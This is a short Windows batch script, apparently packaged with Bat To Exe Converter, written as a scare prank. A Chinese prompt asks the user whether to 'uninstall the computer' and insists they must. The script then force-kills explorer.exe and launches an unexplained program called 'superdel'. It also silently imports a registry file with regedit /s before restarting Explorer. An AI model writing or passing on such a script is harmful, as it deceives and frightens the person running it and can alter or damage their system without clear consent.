::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWH/eyEEkMSdjRQqGM3ypOrMV5O3H3/iIqEgeQN66vmdeHFwLzyuVArRgrXulEJvdehKJ68Dcpv8tluGyVKvEbJQCzSMaRehlkZ618kQ1A2BIAqc3CPDmXMB9isYR1yWyskjnmsU=
::fBE1pAF6MU+EWH/eyEEkMSdjRQqGM3ypOrMV5O3H3/iIqEgeQN66vmdeHFwLzyuVArRgrXulEJvdehKJ68Dcpv8tluGyVKvEbJQCzSMaRehlkZ61YKrynqGZAJcFBM/KLsFtnaM=
::YAwzoRdxOk+EWAjk
::fBw5plQjdCmDJFqQ7X4HIRVQQxORAG2zCrAgpuH44NaEt14JW+9xcYzUug==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCmDJFqQ7X4HIRVQQxORAG2zCrAg2Pr05e+EtnGYkgq6vmdeNX8IyBGXMqhss3eqNKPffxCI1Pbehvwtk8qyc57FTIADwSAYaNndXkeM/k4MnqGTA7gNsK7WuFu1R0T3BqhaDQP6h6Bw
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
color 4c
title 
:loop
echo 确定要卸载电脑吗？
choice /c YN
if /i '%errorlevel%'=='1' goto continue
if /i '%errorlevel%'=='0' goto end
echo 输入有误，您必须卸载电脑：&&goto loop 
:continue
taskkill /f /im explorer.exe
start superdel
pause ->nul
regedit /s  %~dp0\恢复电脑.reg
start explorer.exe